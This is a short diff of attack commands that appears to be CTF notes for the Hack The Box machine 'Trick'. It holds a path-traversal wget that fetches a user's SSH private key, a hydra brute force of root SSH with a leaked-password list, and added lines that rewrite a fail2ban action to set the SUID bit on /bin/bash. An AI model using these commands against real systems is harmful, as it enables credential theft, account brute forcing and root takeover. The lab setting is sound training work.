@@ -1,2 +1,5 @@
 wget "http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa" -O id_rsa
 hydra 10.10.11.166 ssh -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+sed "s/&ltiptables> -I f2b-&ltname> 1 -s &ltip> -j &ltblocktype>/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf > config.conf
+rm -f /etc/fail2ban/action.d/iptables-multiport.conf
+mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf
